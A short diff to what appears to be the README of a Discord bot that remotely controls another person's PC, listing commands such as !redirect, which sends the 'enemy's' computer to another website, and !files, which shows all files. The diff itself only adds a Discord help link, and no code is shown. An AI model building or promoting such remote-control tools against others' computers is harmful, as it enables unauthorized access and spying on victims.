@@ -16,3 +16,5 @@ So this Discord bot allows you to send something like to you/someones pc message
 !redirect: Redirects enemys computer to another website
 !files: Shows all files
 ```
+
+If you need help https://discord.gg/Uus3jJQycn
